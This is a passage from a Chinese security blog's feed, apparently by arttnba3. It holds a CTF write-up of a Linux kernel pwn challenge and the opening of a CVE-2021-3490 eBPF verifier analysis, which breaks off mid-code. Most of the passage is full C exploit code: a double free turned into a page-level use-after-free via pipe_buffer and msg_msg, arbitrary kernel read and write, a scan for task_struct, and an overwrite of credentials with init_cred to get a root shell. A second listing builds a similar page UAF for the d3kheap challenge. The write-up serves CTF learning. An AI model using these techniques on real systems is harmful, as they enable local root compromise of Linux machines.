class="hljs-type">uint32_t</span> key[<span class="hljs-number">4</span>];<br>    <span class="hljs-type">char</span> text[<span class="hljs-number">0</span>];<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> set_msg_hdr(_hdr, _type, _cmd, _status, _tag, _data_len)        \</span><br><span class="hljs-meta">    do &#123;                                                        \</span><br><span class="hljs-meta">        _hdr-&gt;type = _type;                                     \</span><br><span class="hljs-meta">        _hdr-&gt;cmd = _cmd;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;status = _status;                                 \</span><br><span class="hljs-meta">        _hdr-&gt;tag = _tag;                                       \</span><br><span class="hljs-meta">        _hdr-&gt;data_len = _data_len;                             \</span><br><span class="hljs-meta">    &#125; while (0)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> get_hdr_data(__hdr, ptr_type) (&#123;                        \</span><br><span class="hljs-meta">    ((ptr_type*) &amp;__hdr-&gt;data);                                 \</span><br><span class="hljs-meta">&#125;)</span><br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_send_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, SEND_MSG, msg);<br>&#125;<br><br><span class="hljs-type">long</span> <span class="hljs-title function_">kkk_recv_msg</span><span class="hljs-params">(<span class="hljs-type">int</span> dev_fd, <span class="hljs-keyword">struct</span> msg_hdr *msg)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> ioctl(dev_fd, RECV_MSG, msg);<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> *  III - FIRST exploit stage - make page-level UAF</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> rw_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> msqid;<br><span class="hljs-type">size_t</span> msg_buf[<span class="hljs-number">0x1000</span>], *pipe_buf, pipe_ops;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_uaf_on_msg_and_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">msg_hdr</span> *<span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">size_t</span> checksum;<br>    <span class="hljs-type">int</span> ret;<br>    <span class="hljs-type">char</span> *buf;<br><br>    msqid = get_msg_queue();<br><br>    msg = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x200</span>);<br>    <span class="hljs-built_in">memset</span>(msg, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(*msg));<br>    set_msg_hdr(msg, TYPE_REQUEST, CMD_ENCRYPT_TEA, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(*msg));<br><br>    <span class="hljs-comment">/* prepare the pipes in advance */</span><br>    pipe(rw_pipe);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * trigger double free to make pipe_buffer and msg_seg the same object.</span><br><span class="hljs-comment">     * note that we should write and read the pipe in advance, so that it won&#x27;t</span><br><span class="hljs-comment">     * use the pipe_buffer[0], which will lead to an invalid msg_seg</span><br><span class="hljs-comment">     */</span><br>    kkk_send_msg(dev_fd, msg);<br>    sleep(<span class="hljs-number">2</span>);<br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xbeefedead0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    fcntl(rw_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    read(rw_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-keyword">if</span> (kkk_recv_msg(dev_fd, (<span class="hljs-keyword">struct</span> msg_hdr *) <span class="hljs-number">0xdeadbeef0</span>) &lt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[=] errno: %d\n&quot;</span>, errno);<br>    &#125;<br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    peek_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0</span>);<br>    pipe_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) msg_buf + <span class="hljs-number">0x1000</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg));<br>    <span class="hljs-keyword">if</span> (pipe_buf[<span class="hljs-number">12</span>] &lt; <span class="hljs-number">0xffffffff81000000</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to make UAF on pipe!&quot;</span>);<br>    &#125;<br>    pipe_ops = pipe_buf[<span class="hljs-number">12</span>];<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Successfully build UAF pipe_buffer!\033[0m&quot;</span>);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] Page: \033[0m%lx &quot;</span>, pipe_buf[<span class="hljs-number">10</span>]);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m, ops: \033[0m%lx\n&quot;</span>, pipe_ops);<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">fake_buf</span>;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_read_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">5</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0x1ff8</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    read(rw_pipe[<span class="hljs-number">0</span>], buf, <span class="hljs-number">0xfff</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arbitrary_write_by_pipe</span><span class="hljs-params">(<span class="hljs-type">size_t</span> page_addr, <span class="hljs-type">void</span> *buf, <span class="hljs-type">size_t</span> len)</span><br>&#123;<br>    fake_buf = (<span class="hljs-keyword">struct</span> pipe_buffer*) &amp;pipe_buf[<span class="hljs-number">10</span>];<br>    read_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    fake_buf-&gt;page = (<span class="hljs-keyword">struct</span> page*) page_addr;<br>    fake_buf-&gt;len = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;offset = <span class="hljs-number">0</span>;<br>    fake_buf-&gt;ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) pipe_ops;<br><br>    write_msg(msqid, msg_buf, <span class="hljs-number">0x1000</span> + <span class="hljs-number">160</span> - <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> msg_msg) - <span class="hljs-number">8</span>, <span class="hljs-number">0x41</span>);<br><br>    len = len &gt; <span class="hljs-number">0xffe</span> ? <span class="hljs-number">0xffe</span> : len;<br><br>    write(rw_pipe[<span class="hljs-number">1</span>], buf, len);<br>&#125;<br><br><span class="hljs-type">size_t</span> data_buf[<span class="hljs-number">0x1000</span>], *tsk_buf, current_task_page, current_task, parent_task;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">seek_current_task_struct</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span>  *comm_addr;<br><br>    vmemmap_base = pipe_buf[<span class="hljs-number">10</span>] &amp; <span class="hljs-number">0xfffffffff0000000</span>;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] vmemmap_base:\033[0m 0x%lx\n\n&quot;</span>, vmemmap_base);<br><br>    <span class="hljs-comment">/* now seeking for the task_struct in kernel memory */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking task_struct in memory...&quot;</span>);<br><br>    prctl(PR_SET_NAME, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; <span class="hljs-number">1</span>; i++) &#123;<br>        arbitrary_read_by_pipe(vmemmap_base + i * <span class="hljs-number">0x40</span>, data_buf);<br>    <br>        comm_addr = memmem(data_buf, <span class="hljs-number">0xf00</span>, <span class="hljs-string">&quot;arttnba3pwnn&quot;</span>, <span class="hljs-number">12</span>);<br>        <span class="hljs-keyword">if</span> (comm_addr &amp;&amp; (comm_addr[<span class="hljs-number">-2</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-3</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;real_cred */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-61</span>] &gt; <span class="hljs-number">0xffff888000000000</span>) <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            &amp;&amp; (comm_addr[<span class="hljs-number">-60</span>] &gt; <span class="hljs-number">0xffff888000000000</span>)) &#123;  <span class="hljs-comment">/* task-&gt;parent */</span><br><br>            <span class="hljs-comment">/* task-&gt;read_parent */</span><br>            parent_task = comm_addr[<span class="hljs-number">-61</span>];<br><br>            <span class="hljs-comment">/* task_struct::ptraced */</span><br>            current_task = comm_addr[<span class="hljs-number">-54</span>] - <span class="hljs-number">2528</span>;<br><br>            page_offset_base = (comm_addr[<span class="hljs-number">-54</span>]&amp;<span class="hljs-number">0xfffffffffffff000</span>) - i * <span class="hljs-number">0x1000</span>;<br>            page_offset_base &amp;= <span class="hljs-number">0xfffffffff0000000</span>;<br><br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found task_struct on page: \033[0m%lx\n&quot;</span>,<br>                   (vmemmap_base + i * <span class="hljs-number">0x40</span>));<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] page_offset_base: \033[0m0x%lx\n&quot;</span>,<br>                   page_offset_base);<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] current task_struct&#x27;s addr: \033[0m&quot;</span><br>                   <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, current_task);<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_task_overwrite</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-comment">/* finding the init_task, the final parent of every task */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Seeking for init_task...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span> (;;) &#123;<br>        <span class="hljs-type">size_t</span> ptask_page_addr = direct_map_addr_to_page_addr(parent_task);<br><br>        tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (parent_task &amp; <span class="hljs-number">0xfff</span>));<br><br>        arbitrary_read_by_pipe(ptask_page_addr, data_buf);<br>        arbitrary_read_by_pipe(ptask_page_addr+<span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>        <span class="hljs-comment">/* task_struct::real_parent */</span><br>        <span class="hljs-keyword">if</span> (parent_task == tsk_buf[<span class="hljs-number">309</span>]) &#123;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        parent_task = tsk_buf[<span class="hljs-number">309</span>];<br>    &#125;<br><br>    init_task = parent_task;<br>    init_cred = tsk_buf[<span class="hljs-number">367</span>];<br>    init_nsproxy = tsk_buf[<span class="hljs-number">381</span>];<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_task: \033[0m0x%lx\n&quot;</span>, init_task);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_cred: \033[0m0x%lx\n&quot;</span>, init_cred);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Found init_nsproxy:\033[0m0x%lx\n&quot;</span>,init_nsproxy);<br><br>    <span class="hljs-comment">/* now, changing the current task_struct to get the full root :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Escalating ROOT privilege now...&quot;</span>);<br><br>    current_task_page = direct_map_addr_to_page_addr(current_task);<br><br>    arbitrary_read_by_pipe(current_task_page, data_buf);<br>    arbitrary_read_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>]);<br><br>    tsk_buf = (<span class="hljs-type">size_t</span>*) ((<span class="hljs-type">size_t</span>) data_buf + (current_task &amp; <span class="hljs-number">0xfff</span>));<br>    tsk_buf[<span class="hljs-number">367</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">368</span>] = init_cred;<br>    tsk_buf[<span class="hljs-number">381</span>] = init_nsproxy;<br><br>    arbitrary_write_by_pipe(current_task_page, data_buf, <span class="hljs-number">0xff0</span>);<br>    arbitrary_write_by_pipe(current_task_page + <span class="hljs-number">0x40</span>, &amp;data_buf[<span class="hljs-number">512</span>], <span class="hljs-number">0xff0</span>);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+] Done.\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    save_status();<br>    bind_core(<span class="hljs-number">0</span>);<br><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/kkk&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/kkk!&quot;</span>);<br>    &#125;<br><br>    construct_uaf_on_msg_and_pipe();<br>    seek_current_task_struct();<br>    privilege_escalation_by_task_overwrite();<br>    get_root_shell();<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行即可完成提权：</p><p><img src="https://s2.loli.net/2023/07/13/sr65qaWAN9lE4Cy.png" alt="image.png"></p><blockquote><p><del>笔者也不记得该编译选项是否默认开启了</del>，若未开启该编译选项，则仍可以直接构造 page-level UAF，以笔者去年出的题目 <code>d3kheap</code> 为例，可以通过如下方式完成 page UAF 的构造，细节参见注释：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> SECOND_LEVEL_PIPE_NUM 0x100</span><br><br><span class="hljs-type">int</span> victim_pipe[<span class="hljs-number">2</span>], vuln_pipe[<span class="hljs-number">2</span>], holder_pipe[<span class="hljs-number">2</span>];<br><span class="hljs-type">int</span> second_level_pipe[SECOND_LEVEL_PIPE_NUM][<span class="hljs-number">2</span>];<br><span class="hljs-type">size_t</span> pipe_buf[<span class="hljs-number">0x1000</span>];<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">construct_page_uaf_with_pipe</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> checksum;<br><br>    <span class="hljs-built_in">memset</span>(pipe_buf, <span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-keyword">sizeof</span>(pipe_buf));<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        pipe(second_level_pipe[i]);<br>    &#125;<br><br>    <span class="hljs-comment">/* make two pipes point to the same buffer */</span><br>    add();<br>    del();<br>    pipe(victim_pipe);<br>    <br>    del();<br>    pipe(vuln_pipe);<br><br>    <span class="hljs-comment">/* init pipe-&gt;head and pipe-&gt;tail, allocate page on buffer */</span><br>    write(victim_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rat3bant&quot;</span>, <span class="hljs-number">8</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br><br>    <span class="hljs-comment">/* migrate to another buffer, now we have two bufs point on the same page */</span><br>    fcntl(vuln_pipe[<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">4</span>);<br>    write(vuln_pipe[<span class="hljs-number">1</span>], pipe_buf, <span class="hljs-number">0x800</span>); <span class="hljs-comment">/* pre-write for later read */</span><br><br>    read(vuln_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;two pipe didn&#x27;t share the same page!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* now the page is reclaimed to pipe-&gt;tmp_page */</span><br>    read(victim_pipe[<span class="hljs-number">0</span>], &amp;checksum, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (checksum != *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x] Get checksum: %lx\n&quot;</span>, checksum);<br>        err_exit(<span class="hljs-string">&quot;Pipe is corrupted!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* avoid double free dtection */</span><br>    pipe(holder_pipe);<br><br>    <span class="hljs-comment">/* free pipe-&gt;tmp_page */</span><br>    close(victim_pipe[<span class="hljs-number">1</span>]);<br>    close(victim_pipe[<span class="hljs-number">0</span>]);<br><br>    <span class="hljs-comment">/* allocate UAF page as slub page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        fcntl(second_level_pipe[i][<span class="hljs-number">0</span>], F_SETPIPE_SZ, <span class="hljs-number">0x1000</span> * <span class="hljs-number">2</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* init pipe bufs on UAF page */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SECOND_LEVEL_PIPE_NUM; i++) &#123;<br>        write(second_level_pipe[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;arttnba3&quot;</span>, <span class="hljs-number">8</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* enjoy page-level UAF now :) */</span><br>    read(vuln_pipe[<span class="hljs-number">0</span>], pipe_buf, <span class="hljs-number">0x700</span>);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; (<span class="hljs-number">0x700</span> / <span class="hljs-number">8</span>); i++) &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[----data dump----][%d] %lx\n&quot;</span>, i, pipe_buf[i]);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></blockquote><h2 id="漏洞修复-1"><a href="#漏洞修复-1" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p>漏洞修复其实比较简单，只需要把读取失败的基本块的跳转目标改到 <code>kfree()</code> 之后即可：</p><p><img src="https://s2.loli.net/2023/07/14/qdhrM5PyWXYa1Bi.png" alt="image.png"></p><p><img src="https://s2.loli.net/2023/07/14/cdaSR5grHwkG4PL.png" alt="image.png"></p><h1 id="0x03-总结"><a href="#0x03-总结" class="headerlink" title="0x03. 总结"></a>0x03. 总结</h1><p>感觉好像也没有什么好总结的…比较没啥亮点的两道套路题罢了…</p><p><img src="https://s2.loli.net/2023/07/14/TmiUfboV49py2rP.png" alt="image.png"></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;典中典之低质量套路 Pwn 题集合&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="Use After Free" scheme="https://arttnba3.github.io/tags/Use-After-Free/"/>
    
    <category term="CISCN" scheme="https://arttnba3.github.io/tags/CISCN/"/>
    
    <category term="Kernel UAF" scheme="https://arttnba3.github.io/tags/Kernel-UAF/"/>
    
  </entry>
  
  <entry>
    <title>【CVE.0x0A】CVE-2021-3490 漏洞复现及简要分析</title>
    <link href="https://arttnba3.github.io/2023/06/04/CVE-0X0A-CVE-2021-3490/"/>
    <id>https://arttnba3.github.io/2023/06/04/CVE-0X0A-CVE-2021-3490/</id>
    <published>2023-06-03T18:59:40.000Z</published>
    <updated>2023-08-13T08:31:06.000Z</updated>
    
    <content type="html"><![CDATA[<p>那一天，a3 终于回想起了被 VM Pwn 支配的恐怖</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-3490">CVE-2021-3490</a> 是一个发生在 eBPF verifier 中的漏洞，由于 eBPF verifier 在校验位运算操作（ 与、或、异或 ）时没有正确地更新寄存器的 32 位边界，从而导致攻击者可以构造出非法的运行时寄存器值以进行提权；该漏洞在 <a href="https://lore.kernel.org/bpf/158560419880.10843.11448220440809118343.stgit@john-Precision-5820-Tower/">这个 commit</a> 中被引入，在 <a href="https://git.kernel.org/pub/scm/linux/kernel/git/bpf/bpf.git/commit/?id=049c4e13714ecbca567b4d5f6d563f05d431c80e">这个 commit</a> 中被修复</p><p>本文我们选择内核版本 <code>5.11.16</code> 进行分析</p><blockquote><p>注：eBPF 相关基础知识可以看<a href="https://arttnba3.cn/2023/05/31/EBPF_0X00/">这↑里↓</a></p></blockquote><h1 id="0x01-漏洞分析"><a href="#0x01-漏洞分析" class="headerlink" title="0x01. 漏洞分析"></a>0x01. 漏洞分析</h1><p>eBPF 指令的合法性校验通过 eBPF verifier 完成，eBPF verifier 的核心函数便是 <code>do_check()</code>，该函数会遍历每一条指令并根据指令的不同类型进行不同操作，对于算术指令（<code>BPF_ALU</code> &#x2F; <code>BPF_ALU64</code>）而言有如下调用链：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">do_check</span>()<span class="hljs-comment">// 遍历每一条指令并根据类型调用相应函数处理</span><br><span class="hljs-built_in">check_alu_op</span>()<span class="hljs-comment">// 根据算术指令的 opcode 进行不同处理</span><br><span class="hljs-built_in">adjust_reg_min_max_vals</span>()<span class="hljs-comment">// 计算新的寄存器边界值</span><br><span class="hljs-built_in">adjust_scalar_min_max_vals</span>()<span class="hljs-comment">// 根据 opcode 计算具体的新边界值</span><br></code></pre></td></tr></table></figure><p>在 <code>adjust_scalar_min_max_vals()</code> 函数当中会对 32 位与 64 位都进行边界校验（因为实际参与运算的可能是 32 也可能是 64），计算边界值的逻辑主要是先调用 <code>scalar32_min_max_xor()</code> 计算 32 位边界值再调用 <code>scalar_min_max_xor()</code> 计算 64 位边界值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* WARNING: 该函数在 64 位值上进行计算，但实际执行可能在 32 位值上，</span><br><span class="hljs-comment"> * 因此在 32 位的情况下，诸如位移等需要额外的检查.</span><br><span class="hljs-comment"> */</span><br><span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">adjust_scalar_min_max_vals</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_insn *insn,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state *dst_reg,</span><br><span class="hljs-params">      <span class="hljs-keyword">struct</span> bpf_reg_state src_reg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br><span class="hljs-keyword">switch</span> (opcode) &#123;<br><span class="hljs-comment">//...</span><br><span class="hljs-keyword">case</span> BPF_AND:<br>dst_reg-&gt;var_off = tnum_and(dst_reg-&gt;var_off, src_reg.var_off);<br>scalar32_min_max_and(dst_reg, &amp;src_reg);<span class="hljs-comment">/* 漏洞点 